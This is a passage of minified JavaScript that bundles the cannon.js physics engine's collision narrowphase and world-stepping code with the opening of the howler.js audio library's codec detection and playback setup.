g=!0,(R=this.createContactEquation(a,s,e,t)).ri.copy(v),R.ri.normalize(),R.ni.copy(R.ri),R.ri.mult(d,R.ri),m.vsub(n,R.rj),R.ri.vadd(i,R.ri),R.ri.vsub(a.position,R.ri),R.rj.vadd(n,R.rj),R.rj.vsub(s.position,R.rj),this.result.push(R),void this.createFrictionEquationsFromContact(R,this.frictionResult)}for(var g=!1,y=(p=0,h.length);p!==y&&!1===g;p++){var b=l[p],w=h[p],x=re;o.vmult(b,x);var _=oe;o.vmult(u[w[0]],_),_.vadd(n,_);var M=ae;x.mult(-d,M),i.vadd(M,M);var S=se;M.vsub(_,S);var T=S.dot(x),E=ce;if(i.vsub(_,E),T<0&&E.dot(x)>0){for(var A=[],C=0,P=w.length;C!==P;C++){var L=c.get();o.vmult(u[w[C]],L),n.vadd(L,L),A.push(L)}if(H(A,x,i)){g=!0;var R=this.createContactEquation(a,s,e,t);x.mult(-d,R.ri),x.negate(R.ni);var k=c.get();x.mult(-T,k);var O=c.get();x.mult(-d,O),i.vsub(n,R.rj),R.rj.vadd(O,R.rj),R.rj.vadd(k,R.rj),R.rj.vadd(n,R.rj),R.rj.vsub(s.position,R.rj),R.ri.vadd(i,R.ri),R.ri.vsub(a.position,R.ri),c.release(k),c.release(O),this.result.push(R),this.createFrictionEquationsFromContact(R,this.frictionResult),C=0;for(var I=A.length;C!==I;C++)c.release(A[C]);return}for(C=0;C!==w.length;C++){var B=c.get(),D=c.get();o.vmult(u[w[(C+1)%w.length]],B),o.vmult(u[w[(C+2)%w.length]],D),n.vadd(B,B),n.vadd(D,D);var z=ee;D.vsub(B,z);var F=te;z.unit(F);var N=c.get(),j=c.get();i.vsub(B,j);var U=j.dot(F);F.mult(U,N),N.vadd(B,N);var V=c.get();if(N.vsub(i,V),U>0&&U*U<z.norm2()&&V.norm2()<d*d){for(R=this.createContactEquation(a,s,e,t),N.vsub(n,R.rj),N.vsub(i,R.ni),R.ni.normalize(),R.ni.mult(d,R.ri),R.rj.vadd(n,R.rj),R.rj.vsub(s.position,R.rj),R.ri.vadd(i,R.ri),R.ri.vsub(a.position,R.ri),this.result.push(R),this.createFrictionEquationsFromContact(R,this.frictionResult),C=0,I=A.length;C!==I;C++)c.release(A[C]);return c.release(B),c.release(D),c.release(N),c.release(V),void c.release(j)}c.release(B),c.release(D),c.release(N),c.release(V),c.release(j)}for(C=0,I=A.length;C!==I;C++)c.release(A[C])}}},new a,new a,d.prototype[r.types.PLANE|r.types.BOX]=d.prototype.planeBox=function(e,t,i,n,r,o,a,s){t.convexPolyhedronRepresentation.material=t.material,t.convexPolyhedronRepresentation.collisionResponse=t.collisionResponse,this.planeConvex(e,t.convexPolyhedronRepresentation,i,n,r,o,a,s)};var le=new a,he=new a,ue=new a,de=new a;d.prototype[r.types.PLANE|r.types.CONVEXPOLYHEDRON]=d.prototype.planeConvex=function(e,t,i,n,r,o,a,s){var c=le,l=he;l.set(0,0,1),r.vmult(l,l);for(var h=0,u=ue,d=0;d!==t.vertices.length;d++)if(c.copy(t.vertices[d]),o.vmult(c,c),n.vadd(c,c),c.vsub(i,u),l.dot(u)<=0){var p=this.createContactEquation(a,s,e,t),f=de;l.mult(l.dot(u),f),c.vsub(f,f),f.vsub(i,p.ri),p.ni.copy(l),c.vsub(n,p.rj),p.ri.vadd(i,p.ri),p.ri.vsub(a.position,p.ri),p.rj.vadd(n,p.rj),p.rj.vsub(s.position,p.rj),this.result.push(p),h++,this.enableFrictionReduction||this.createFrictionEquationsFromContact(p,this.frictionResult)}this.enableFrictionReduction&&h&&this.createFrictionFromAverage(h)};var pe=new a,fe=new a;d.prototype[r.types.CONVEXPOLYHEDRON]=d.prototype.convexConvex=function(e,t,i,n,r,o,a,s,c,l,h,u){var d=pe;if(!(i.distanceTo(n)>e.boundingSphereRadius+t.boundingSphereRadius)&&e.findSeparatingAxis(t,i,r,n,o,d,h,u)){var p=[],f=fe;e.clipAgainstHull(i,r,t,n,o,d,-100,100,p);for(var m=0,v=0;v!==p.length;v++){var g=this.createContactEquation(a,s,e,t,c,l),y=g.ri,b=g.rj;d.negate(g.ni),p[v].normal.negate(f),f.mult(p[v].depth,f),p[v].point.vadd(f,y),b.copy(p[v].point),y.vsub(i,y),b.vsub(n,b),y.vadd(i,y),y.vsub(a.position,y),b.vadd(n,b),b.vsub(s.position,b),this.result.push(g),m++,this.enableFrictionReduction||this.createFrictionEquationsFromContact(g,this.frictionResult)}this.enableFrictionReduction&&m&&this.createFrictionFromAverage(m)}};var me=new a,ve=new a,ge=new a;d.prototype[r.types.PLANE|r.types.PARTICLE]=d.prototype.planeParticle=function(e,t,i,n,r,o,a,s){var c=me;c.set(0,0,1),a.quaternion.vmult(c,c);var l=ve;if(n.vsub(a.position,l),c.dot(l)<=0){var h=this.createContactEquation(s,a,t,e);h.ni.copy(c),h.ni.negate(h.ni),h.ri.set(0,0,0);var u=ge;c.mult(c.dot(n),u),n.vsub(u,u),h.rj.copy(u),this.result.push(h),this.createFrictionEquationsFromContact(h,this.frictionResult)}};var ye=new a;d.prototype[r.types.PARTICLE|r.types.SPHERE]=d.prototype.sphereParticle=function(e,t,i,n,r,o,a,s){var c=ye;if(c.set(0,0,1),n.vsub(i,c),c.norm2()<=e.radius*e.radius){var l=this.createContactEquation(s,a,t,e);c.normalize(),l.rj.copy(c),l.rj.mult(e.radius,l.rj),l.ni.copy(c),l.ni.negate(l.ni),l.ri.set(0,0,0),this.result.push(l),this.createFrictionEquationsFromContact(l,this.frictionResult)}};var be=new c,we=new a,xe=(new a,new a),_e=new a,Me=new a;d.prototype[r.types.PARTICLE|r.types.CONVEXPOLYHEDRON]=d.prototype.convexParticle=function(e,t,i,n,r,o,a,s){var c=-1,l=xe,h=Me,u=null,d=we;if(d.copy(n),d.vsub(i,d),r.conjugate(be),be.vmult(d,d),e.pointIsInside(d)){e.worldVerticesNeedsUpdate&&e.computeWorldVertices(i,r),e.worldFaceNormalsNeedsUpdate&&e.computeWorldFaceNormals(r);for(var p=0,f=e.faces.length;p!==f;p++){var m=[e.worldVertices[e.faces[p][0]]],v=e.worldFaceNormals[p];n.vsub(m[0],_e);var g=-v.dot(_e);(null===u||Math.abs(g)<Math.abs(u))&&(u=g,c=p,l.copy(v))}if(-1!==c){var y=this.createContactEquation(s,a,t,e);l.mult(u,h),h.vadd(n,h),h.vsub(i,h),y.rj.copy(h),l.negate(y.ni),y.ri.set(0,0,0);var b=y.ri,w=y.rj;b.vadd(n,b),b.vsub(s.position,b),w.vadd(i,w),w.vsub(a.position,w),this.result.push(y),this.createFrictionEquationsFromContact(y,this.frictionResult)}else console.warn("Point found inside convex, but did not find penetrating face!")}},d.prototype[r.types.BOX|r.types.HEIGHTFIELD]=d.prototype.boxHeightfield=function(e,t,i,n,r,o,a,s){e.convexPolyhedronRepresentation.material=e.material,e.convexPolyhedronRepresentation.collisionResponse=e.collisionResponse,this.convexHeightfield(e.convexPolyhedronRepresentation,t,i,n,r,o,a,s)};var Se=new a,Te=new a,Ee=[0];d.prototype[r.types.CONVEXPOLYHEDRON|r.types.HEIGHTFIELD]=d.prototype.convexHeightfield=function(e,t,i,n,r,o,a,c){var l=t.data,h=t.elementSize,u=e.boundingSphereRadius,d=Te,p=Ee,f=Se;s.pointToLocalFrame(n,o,i,f);var m=Math.floor((f.x-u)/h)-1,v=Math.ceil((f.x+u)/h)+1,g=Math.floor((f.y-u)/h)-1,y=Math.ceil((f.y+u)/h)+1;if(!(v<0||y<0||m>l.length||g>l[0].length)){m<0&&(m=0),v<0&&(v=0),g<0&&(g=0),y<0&&(y=0),m>=l.length&&(m=l.length-1),v>=l.length&&(v=l.length-1),y>=l[0].length&&(y=l[0].length-1),g>=l[0].length&&(g=l[0].length-1);var b=[];t.getRectMinMax(m,g,v,y,b);var w=b[0],x=b[1];if(!(f.z-u>x||f.z+u<w))for(var _=m;_<v;_++)for(var M=g;M<y;M++)t.getConvexTrianglePillar(_,M,!1),s.pointToWorldFrame(n,o,t.pillarOffset,d),i.distanceTo(d)<t.pillarConvex.boundingSphereRadius+e.boundingSphereRadius&&this.convexConvex(e,t.pillarConvex,i,d,r,o,a,c,null,null,p,null),t.getConvexTrianglePillar(_,M,!0),s.pointToWorldFrame(n,o,t.pillarOffset,d),i.distanceTo(d)<t.pillarConvex.boundingSphereRadius+e.boundingSphereRadius&&this.convexConvex(e,t.pillarConvex,i,d,r,o,a,c,null,null,p,null)}};var Ae=new a,Ce=new a;d.prototype[r.types.SPHERE|r.types.HEIGHTFIELD]=d.prototype.sphereHeightfield=function(e,t,i,n,r,o,a,c){var l=t.data,h=e.radius,u=t.elementSize,d=Ce,p=Ae;s.pointToLocalFrame(n,o,i,p);var f=Math.floor((p.x-h)/u)-1,m=Math.ceil((p.x+h)/u)+1,v=Math.floor((p.y-h)/u)-1,g=Math.ceil((p.y+h)/u)+1;if(!(m<0||g<0||f>l.length||g>l[0].length)){f<0&&(f=0),m<0&&(m=0),v<0&&(v=0),g<0&&(g=0),f>=l.length&&(f=l.length-1),m>=l.length&&(m=l.length-1),g>=l[0].length&&(g=l[0].length-1),v>=l[0].length&&(v=l[0].length-1);var y=[];t.getRectMinMax(f,v,m,g,y);var b=y[0],w=y[1];if(!(p.z-h>w||p.z+h<b))for(var x=this.result,_=f;_<m;_++)for(var M=v;M<g;M++){var S=x.length;if(t.getConvexTrianglePillar(_,M,!1),s.pointToWorldFrame(n,o,t.pillarOffset,d),i.distanceTo(d)<t.pillarConvex.boundingSphereRadius+e.boundingSphereRadius&&this.sphereConvex(e,t.pillarConvex,i,d,r,o,a,c),t.getConvexTrianglePillar(_,M,!0),s.pointToWorldFrame(n,o,t.pillarOffset,d),i.distanceTo(d)<t.pillarConvex.boundingSphereRadius+e.boundingSphereRadius&&this.sphereConvex(e,t.pillarConvex,i,d,r,o,a,c),x.length-S>2)return}}}},{"../collision/AABB":3,"../collision/Ray":9,"../equations/ContactEquation":19,"../equations/FrictionEquation":21,"../math/Quaternion":28,"../math/Transform":29,"../math/Vec3":30,"../shapes/ConvexPolyhedron":38,"../shapes/Shape":43,"../solver/Solver":47,"../utils/Vec3Pool":54}],56:[function(e,t,i){t.exports=y;var n=e("../shapes/Shape"),r=e("../math/Vec3"),o=e("../math/Quaternion"),a=e("../solver/GSSolver"),s=(e("../utils/Vec3Pool"),e("../equations/ContactEquation"),e("../equations/FrictionEquation"),e("./Narrowphase")),c=e("../utils/EventTarget"),l=e("../collision/ArrayCollisionMatrix"),h=e("../material/Material"),u=e("../material/ContactMaterial"),d=e("../objects/Body"),p=e("../utils/TupleDictionary"),f=e("../collision/RaycastResult"),m=e("../collision/AABB"),v=e("../collision/Ray"),g=e("../collision/NaiveBroadphase");function y(){c.apply(this),this.dt=-1,this.allowSleep=!1,this.contacts=[],this.frictionEquations=[],this.quatNormalizeSkip=0,this.quatNormalizeFast=!1,this.time=0,this.stepnumber=0,this.default_dt=1/60,this.nextId=0,this.gravity=new r,this.broadphase=new g,this.bodies=[],this.solver=new a,this.constraints=[],this.narrowphase=new s(this),this.collisionMatrix=new l,this.collisionMatrixPrevious=new l,this.materials=[],this.contactmaterials=[],this.contactMaterialTable=new p,this.defaultMaterial=new h("default"),this.defaultContactMaterial=new u(this.defaultMaterial,this.defaultMaterial,{friction:.3,restitution:0}),this.doProfiling=!1,this.profile={solve:0,makeContactConstraints:0,broadphase:0,integrate:0,narrowphase:0},this.subsystems=[],this.addBodyEvent={type:"addBody",body:null},this.removeBodyEvent={type:"removeBody",body:null}}y.prototype=new c,new m;var b=new v;if(y.prototype.getContactMaterial=function(e,t){return this.contactMaterialTable.get(e.id,t.id)},y.prototype.numObjects=function(){return this.bodies.length},y.prototype.collisionMatrixTick=function(){var e=this.collisionMatrixPrevious;this.collisionMatrixPrevious=this.collisionMatrix,this.collisionMatrix=e,this.collisionMatrix.reset()},y.prototype.add=y.prototype.addBody=function(e){-1===this.bodies.indexOf(e)&&(e.index=this.bodies.length,this.bodies.push(e),e.world=this,e.initPosition.copy(e.position),e.initVelocity.copy(e.velocity),e.timeLastSleepy=this.time,e instanceof d&&(e.initAngularVelocity.copy(e.angularVelocity),e.initQuaternion.copy(e.quaternion)),this.collisionMatrix.setNumObjects(this.bodies.length),this.addBodyEvent.body=e,this.dispatchEvent(this.addBodyEvent))},y.prototype.addConstraint=function(e){this.constraints.push(e)},y.prototype.removeConstraint=function(e){var t=this.constraints.indexOf(e);-1!==t&&this.constraints.splice(t,1)},y.prototype.rayTest=function(e,t,i){i instanceof f?this.raycastClosest(e,t,{skipBackfaces:!0},i):this.raycastAll(e,t,{skipBackfaces:!0},i)},y.prototype.raycastAll=function(e,t,i,n){return i.mode=v.ALL,i.from=e,i.to=t,i.callback=n,b.intersectWorld(this,i)},y.prototype.raycastAny=function(e,t,i,n){return i.mode=v.ANY,i.from=e,i.to=t,i.result=n,b.intersectWorld(this,i)},y.prototype.raycastClosest=function(e,t,i,n){return i.mode=v.CLOSEST,i.from=e,i.to=t,i.result=n,b.intersectWorld(this,i)},y.prototype.remove=function(e){e.world=null;var t=this.bodies.length-1,i=this.bodies,n=i.indexOf(e);if(-1!==n){i.splice(n,1);for(var r=0;r!==i.length;r++)i[r].index=r;this.collisionMatrix.setNumObjects(t),this.removeBodyEvent.body=e,this.dispatchEvent(this.removeBodyEvent)}},y.prototype.removeBody=y.prototype.remove,y.prototype.addMaterial=function(e){this.materials.push(e)},y.prototype.addContactMaterial=function(e){this.contactmaterials.push(e),this.contactMaterialTable.set(e.materials[0].id,e.materials[1].id,e)},"undefined"==typeof performance&&(performance={}),!performance.now){var w=Date.now();performance.timing&&performance.timing.navigationStart&&(w=performance.timing.navigationStart),performance.now=function(){return Date.now()-w}}var x=new r;y.prototype.step=function(e,t,i){if(i=i||10,0===(t=t||0))this.internalStep(e),this.time+=e;else{var n=Math.floor((this.time+t)/e)-Math.floor(this.time/e);n=Math.min(n,i);for(var r=performance.now(),o=0;o!==n&&(this.internalStep(e),!(performance.now()-r>1e3*e));o++);this.time+=t;for(var a=this.time%e/e,s=x,c=this.bodies,l=0;l!==c.length;l++){var h=c[l];h.type!==d.STATIC&&h.sleepState!==d.SLEEPING?(h.position.vsub(h.previousPosition,s),s.scale(a,s),h.position.vadd(s,h.interpolatedPosition)):(h.interpolatedPosition.copy(h.position),h.interpolatedQuaternion.copy(h.quaternion))}}};var _={type:"postStep"},M={type:"preStep"},S={type:"collide",body:null,contact:null},T=[],E=[],A=[],C=[],P=(new r,new r,new r,new r,new r,new r,new r,new r,new r,new o,new o),L=new o,R=new r;y.prototype.internalStep=function(e){this.dt=e;var t,i=this.contacts,r=A,o=C,a=this.numObjects(),s=this.bodies,c=this.solver,l=this.gravity,h=this.doProfiling,u=this.profile,p=d.DYNAMIC,f=this.constraints,m=E,v=(l.norm(),l.x),g=l.y,y=l.z,b=0;for(h&&(t=performance.now()),b=0;b!==a;b++)if((j=s[b]).type&p){var w=j.force,x=j.mass;w.x+=x*v,w.y+=x*g,w.z+=x*y}b=0;for(var k=this.subsystems.length;b!==k;b++)this.subsystems[b].update();h&&(t=performance.now()),r.length=0,o.length=0,this.broadphase.collisionPairs(this,r,o),h&&(u.broadphase=performance.now()-t);var O=f.length;for(b=0;b!==O;b++)if(!(V=f[b]).collideConnected)for(var I=r.length-1;I>=0;I-=1)(V.bodyA===r[I]&&V.bodyB===o[I]||V.bodyB===r[I]&&V.bodyA===o[I])&&(r.splice(I,1),o.splice(I,1));this.collisionMatrixTick(),h&&(t=performance.now());var B=T,D=i.length;for(b=0;b!==D;b++)B.push(i[b]);i.length=0;var z=this.frictionEquations.length;for(b=0;b!==z;b++)m.push(this.frictionEquations[b]);for(this.frictionEquations.length=0,this.narrowphase.getContacts(r,o,this,i,B,this.frictionEquations,m),h&&(u.narrowphase=performance.now()-t),h&&(t=performance.now()),b=0;b<this.frictionEquations.length;b++)c.addEquation(this.frictionEquations[b]);for(var F=i.length,N=0;N!==F;N++){var j=(V=i[N]).bi,U=V.bj;V.si,V.sj,(j.material&&U.material&&this.getContactMaterial(j.material,U.material)||this.defaultContactMaterial).friction,j.material&&U.material&&(j.material.friction>=0&&U.material.friction>=0&&(j.material.friction,U.material.friction),j.material.restitution>=0&&U.material.restitution>=0&&(V.restitution=j.material.restitution*U.material.restitution)),c.addEquation(V),j.allowSleep&&j.type===d.DYNAMIC&&j.sleepState===d.SLEEPING&&U.sleepState===d.AWAKE&&U.type!==d.STATIC&&U.velocity.norm2()+U.angularVelocity.norm2()>=2*Math.pow(U.sleepSpeedLimit,2)&&(j._wakeUpAfterNarrowphase=!0),U.allowSleep&&U.type===d.DYNAMIC&&U.sleepState===d.SLEEPING&&j.sleepState===d.AWAKE&&j.type!==d.STATIC&&j.velocity.norm2()+j.angularVelocity.norm2()>=2*Math.pow(j.sleepSpeedLimit,2)&&(U._wakeUpAfterNarrowphase=!0),this.collisionMatrix.set(j,U,!0),this.collisionMatrixPrevious.get(j,U)||(S.body=U,S.contact=V,j.dispatchEvent(S),S.body=j,U.dispatchEvent(S))}for(h&&(u.makeContactConstraints=performance.now()-t,t=performance.now()),b=0;b!==a;b++)(j=s[b])._wakeUpAfterNarrowphase&&(j.wakeUp(),j._wakeUpAfterNarrowphase=!1);for(O=f.length,b=0;b!==O;b++){var V;(V=f[b]).update(),I=0;for(var H=V.equations.length;I!==H;I++){var G=V.equations[I];c.addEquation(G)}}c.solve(e,this),h&&(u.solve=performance.now()-t),c.removeAllEquations();var W=Math.pow;for(b=0;b!==a;b++)if((j=s[b]).type&p){var q=W(1-j.linearDamping,e),X=j.velocity;X.mult(q,X);var Y=j.angularVelocity;if(Y){var Z=W(1-j.angularDamping,e);Y.mult(Z,Y)}}for(this.dispatchEvent(M),b=0;b!==a;b++)(j=s[b]).preStep&&j.preStep.call(j);h&&(t=performance.now());var Q=P,$=L,J=this.stepnumber,K=d.DYNAMIC|d.KINEMATIC,ee=J%(this.quatNormalizeSkip+1)==0,te=this.quatNormalizeFast,ie=.5*e;for(n.types.PLANE,n.types.CONVEXPOLYHEDRON,b=0;b!==a;b++){var ne=s[b],re=ne.force,oe=ne.torque;if(ne.type&K&&ne.sleepState!==d.SLEEPING){var ae=ne.velocity,se=ne.angularVelocity,ce=ne.position,le=ne.quaternion,he=ne.invMass,ue=ne.invInertiaWorld;ae.x+=re.x*he*e,ae.y+=re.y*he*e,ae.z+=re.z*he*e,ne.angularVelocity&&(ue.vmult(oe,R),R.mult(e,R),R.vadd(se,se)),ce.x+=ae.x*e,ce.y+=ae.y*e,ce.z+=ae.z*e,ne.angularVelocity&&(Q.set(se.x,se.y,se.z,0),Q.mult(le,$),le.x+=ie*$.x,le.y+=ie*$.y,le.z+=ie*$.z,le.w+=ie*$.w,ee&&(te?le.normalizeFast():le.normalize())),ne.aabb&&(ne.aabbNeedsUpdate=!0),ne.updateInertiaWorld&&ne.updateInertiaWorld()}}for(this.clearForces(),this.broadphase.dirty=!0,h&&(u.integrate=performance.now()-t),this.time+=e,this.stepnumber+=1,this.dispatchEvent(_),b=0;b!==a;b++){var de=(j=s[b]).postStep;de&&de.call(j)}if(this.allowSleep)for(b=0;b!==a;b++)s[b].sleepTick(this.time)},y.prototype.clearForces=function(){for(var e=this.bodies,t=e.length,i=0;i!==t;i++){var n=e[i];n.force,n.torque,n.force.set(0,0,0),n.torque.set(0,0,0)}}},{"../collision/AABB":3,"../collision/ArrayCollisionMatrix":4,"../collision/NaiveBroadphase":7,"../collision/Ray":9,"../collision/RaycastResult":10,"../equations/ContactEquation":19,"../equations/FrictionEquation":21,"../material/ContactMaterial":24,"../material/Material":25,"../math/Quaternion":28,"../math/Vec3":30,"../objects/Body":31,"../shapes/Shape":43,"../solver/GSSolver":46,"../utils/EventTarget":49,"../utils/TupleDictionary":52,"../utils/Vec3Pool":54,"./Narrowphase":55}]},{},[2])(2)},function(e,t,i){(function(i){var n;!function(){"use strict";var r=function(){this.init()};r.prototype={init:function(){var e=this||o;return e._counter=1e3,e._html5AudioPool=[],e.html5PoolSize=10,e._codecs={},e._howls=[],e._muted=!1,e._volume=1,e._canPlayEvent="canplaythrough",e._navigator="undefined"!=typeof window&&window.navigator?window.navigator:null,e.masterGain=null,e.noAudio=!1,e.usingWebAudio=!0,e.autoSuspend=!0,e.ctx=null,e.autoUnlock=!0,e._setup(),e},volume:function(e){var t=this||o;if(e=parseFloat(e),t.ctx||p(),void 0!==e&&e>=0&&e<=1){if(t._volume=e,t._muted)return t;t.usingWebAudio&&t.masterGain.gain.setValueAtTime(e,o.ctx.currentTime);for(var i=0;i<t._howls.length;i++)if(!t._howls[i]._webAudio)for(var n=t._howls[i]._getSoundIds(),r=0;r<n.length;r++){var a=t._howls[i]._soundById(n[r]);a&&a._node&&(a._node.volume=a._volume*e)}return t}return t._volume},mute:function(e){var t=this||o;t.ctx||p(),t._muted=e,t.usingWebAudio&&t.masterGain.gain.setValueAtTime(e?0:t._volume,o.ctx.currentTime);for(var i=0;i<t._howls.length;i++)if(!t._howls[i]._webAudio)for(var n=t._howls[i]._getSoundIds(),r=0;r<n.length;r++){var a=t._howls[i]._soundById(n[r]);a&&a._node&&(a._node.muted=!!e||a._muted)}return t},unload:function(){for(var e=this||o,t=e._howls.length-1;t>=0;t--)e._howls[t].unload();return e.usingWebAudio&&e.ctx&&void 0!==e.ctx.close&&(e.ctx.close(),e.ctx=null,p()),e},codecs:function(e){return(this||o)._codecs[e.replace(/^x-/,"")]},_setup:function(){var e=this||o;if(e.state=e.ctx&&e.ctx.state||"suspended",e._autoSuspend(),!e.usingWebAudio)if("undefined"!=typeof Audio)try{void 0===(new Audio).oncanplaythrough&&(e._canPlayEvent="canplay")}catch(t){e.noAudio=!0}else e.noAudio=!0;try{(new Audio).muted&&(e.noAudio=!0)}catch(e){}return e.noAudio||e._setupCodecs(),e},_setupCodecs:function(){var e=this||o,t=null;try{t="undefined"!=typeof Audio?new Audio:null}catch(t){return e}if(!t||"function"!=typeof t.canPlayType)return e;var i=t.canPlayType("audio/mpeg;").replace(/^no$/,""),n=e._navigator&&e._navigator.userAgent.match(/OPR\/([0-6].)/g),r=n&&parseInt(n[0].split("/")[1],10)<33;return e._codecs={mp3:!(r||!i&&!t.canPlayType("audio/mp3;").replace(/^no$/,"")),mpeg:!!i,opus:!!t.canPlayType('audio/ogg; codecs="opus"').replace(/^no$/,""),ogg:!!t.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/,""),oga:!!t.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/,""),wav:!!t.canPlayType('audio/wav; codecs="1"').replace(/^no$/,""),aac:!!t.canPlayType("audio/aac;").replace(/^no$/,""),caf:!!t.canPlayType("audio/x-caf;").replace(/^no$/,""),m4a:!!(t.canPlayType("audio/x-m4a;")||t.canPlayType("audio/m4a;")||t.canPlayType("audio/aac;")).replace(/^no$/,""),mp4:!!(t.canPlayType("audio/x-mp4;")||t.canPlayType("audio/mp4;")||t.canPlayType("audio/aac;")).replace(/^no$/,""),weba:!!t.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/,""),webm:!!t.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/,""),dolby:!!t.canPlayType('audio/mp4; codecs="ec-3"').replace(/^no$/,""),flac:!!(t.canPlayType("audio/x-flac;")||t.canPlayType("audio/flac;")).replace(/^no$/,"")},e},_unlockAudio:function(){var e=this||o;if(!e._audioUnlocked&&e.ctx){e._audioUnlocked=!1,e.autoUnlock=!1,e._mobileUnloaded||44100===e.ctx.sampleRate||(e._mobileUnloaded=!0,e.unload()),e._scratchBuffer=e.ctx.createBuffer(1,1,22050);var t=function(i){for(var n=0;n<e.html5PoolSize;n++)try{var r=new Audio;r._unlocked=!0,e._releaseHtml5Audio(r)}catch(i){e.noAudio=!0}for(n=0;n<e._howls.length;n++)if(!e._howls[n]._webAudio)for(var o=e._howls[n]._getSoundIds(),a=0;a<o.length;a++){var s=e._howls[n]._soundById(o[a]);s&&s._node&&!s._node._unlocked&&(s._node._unlocked=!0,s._node.load())}e._autoResume();var c=e.ctx.createBufferSource();c.buffer=e._scratchBuffer,c.connect(e.ctx.destination),void 0===c.start?c.noteOn(0):c.start(0),"function"==typeof e.ctx.resume&&e.ctx.resume(),c.onended=function(){c.disconnect(0),e._audioUnlocked=!0,document.removeEventListener("touchstart",t,!0),document.removeEventListener("touchend",t,!0),document.removeEventListener("click",t,!0);for(var i=0;i<e._howls.length;i++)e._howls[i]._emit("unlock")}};return document.addEventListener("touchstart",t,!0),document.addEventListener("touchend",t,!0),document.addEventListener("click",t,!0),e}},_obtainHtml5Audio:function(){var e=this||o;if(e._html5AudioPool.length)return e._html5AudioPool.pop();var t=(new Audio).play();return t&&"undefined"!=typeof Promise&&(t instanceof Promise||"function"==typeof t.then)&&t.catch((function(){console.warn("HTML5 Audio pool exhausted, returning potentially locked audio object.")})),new Audio},_releaseHtml5Audio:function(e){var t=this||o;return e._unlocked&&t._html5AudioPool.push(e),t},_autoSuspend:function(){var e=this;if(e.autoSuspend&&e.ctx&&void 0!==e.ctx.suspend&&o.usingWebAudio){for(var t=0;t<e._howls.length;t++)if(e._howls[t]._webAudio)for(var i=0;i<e._howls[t]._sounds.length;i++)if(!e._howls[t]._sounds[i]._paused)return e;return e._suspendTimer&&clearTimeout(e._suspendTimer),e._suspendTimer=setTimeout((function(){e.autoSuspend&&(e._suspendTimer=null,e.state="suspending",e.ctx.suspend().then((function(){e.state="suspended",e._resumeAfterSuspend&&(delete e._resumeAfterSuspend,e._autoResume())})))}),3e4),e}},_autoResume:function(){var e=this;if(e.ctx&&void 0!==e.ctx.resume&&o.usingWebAudio)return"running"===e.state&&e._suspendTimer?(clearTimeout(e._suspendTimer),e._suspendTimer=null):"suspended"===e.state?(e.ctx.resume().then((function(){e.state="running";for(var t=0;t<e._howls.length;t++)e._howls[t]._emit("resume")})),e._suspendTimer&&(clearTimeout(e._suspendTimer),e._suspendTimer=null)):"suspending"===e.state&&(e._resumeAfterSuspend=!0),e}};var o=new r,a=function(e){e.src&&0!==e.src.length?this.init(e):console.error("An array of source files must be passed with any new Howl.")};a.prototype={init:function(e){var t=this;return o.ctx||p(),t._autoplay=e.autoplay||!1,t._format="string"!=typeof e.format?e.format:[e.format],t._html5=e.html5||!1,t._muted=e.mute||!1,t._loop=e.loop||!1,t._pool=e.pool||5,t._preload="boolean"!=typeof e.preload||e.preload,t._rate=e.rate||1,t._sprite=e.sprite||{},t._src="string"!=typeof e.src?e.src:[e.src],t._volume=void 0!==e.volume?e.volume:1,t._xhrWithCredentials=e.xhrWithCredentials||!1,t._duration=0,t._state="unloaded",t._sounds=[],t._endTimers={},t._queue=[],t._playLock=!1,t._onend=e.onend?[{fn:e.onend}]:[],t._onfade=e.onfade?[{fn:e.onfade}]:[],t._onload=e.onload?[{fn:e.onload}]:[],t._onloaderror=e.onloaderror?[{fn:e.onloaderror}]:[],t._onplayerror=e.onplayerror?[{fn:e.onplayerror}]:[],t._onpause=e.onpause?[{fn:e.onpause}]:[],t._onplay=e.onplay?[{fn:e.onplay}]:[],t._onstop=e.onstop?[{fn:e.onstop}]:[],t._onmute=e.onmute?[{fn:e.onmute}]:[],t._onvolume=e.onvolume?[{fn:e.onvolume}]:[],t._onrate=e.onrate?[{fn:e.onrate}]:[],t._onseek=e.onseek?[{fn:e.onseek}]:[],t._onunlock=e.onunlock?[{fn:e.onunlock}]:[],t._onresume=[],t._webAudio=o.usingWebAudio&&!t._html5,void 0!==o.ctx&&o.ctx&&o.autoUnlock&&o._unlockAudio(),o._howls.push(t),t._autoplay&&t._queue.push({event:"play",action:function(){t.play()}}),t._preload&&t.load(),t},load:function(){var e=null;if(o.noAudio)this._emit("loaderror",null,"No audio support.");else{"string"==typeof this._src&&(this._src=[this._src]);for(var t=0;t<this._src.length;t++){var i,n;if(this._format&&this._format[t])i=this._format[t];else{if("string"!=typeof(n=this._src[t])){this._emit("loaderror",null,"Non-string found in selected audio sources - ignoring.");continue}(i=/^data:audio\/([^;,]+);/i.exec(n))||(i=/\.([^.]+)$/.exec(n.split("?",1)[0])),i&&(i=i[1].toLowerCase())}if(i||console.warn('No file extension was found. Consider using the "format" property or specify an extension.'),i&&o.codecs(i)){e=this._src[t];break}}if(e)return this._src=e,this._state="loading","https:"===window.location.protocol&&"http:"===e.slice(0,5)&&(this._html5=!0,this._webAudio=!1),new s(this),this._webAudio&&l(this),this;this._emit("loaderror",null,"No codec support for selected audio sources.")}},play:function(e,t){var i=this,n=null;if("number"==typeof e)n=e,e=null;else{if("string"==typeof e&&"loaded"===i._state&&!i._sprite[e])return null;if(void 0===e&&(e="__default",!i._playLock)){for(var r=0,a=0;a<i._sounds.length;a++)i._sounds[a]._paused&&!i._sounds[a]._ended&&(r++,n=i._sounds[a]._id);1===r?e=null:n=null}}var s=n?i._soundById(n):i._inactiveSound();if(!s)return null;if(n&&!e&&(e=s._sprite||"__default"),"loaded"!==i._state){s._sprite=e,s._ended=!1;var c=s._id;return i._queue.push({event:"play",action:function(){i.play(c)}}),c}if(n&&!s._paused)return t||i._loadQueue("play"),s._id;i._webAudio&&o._autoResume();var l=Math.max(0,s._seek>0?s._seek:i._sprite[e][0]/1e3),h=Math.max(0,(i._sprite[e][0]+i._sprite[e][1])/1e3-l),u=1e3*h/Math.abs(s._rate),d=i._sprite[e][0]/1e3,p=(i._sprite[e][0]+i._sprite[e][1])/1e3,f=!(!s._loop&&!i._sprite[e][2]);s._sprite=e,s._ended=!1;var m=function(){s._paused=!1,s._seek=l,s._start=d,s._stop=p,s._loop=f};if(!(l>=p)){var v=s._node;if(i._webAudio){var g=function(){i._playLock=!1,m(),i._refreshBuffer(s);var 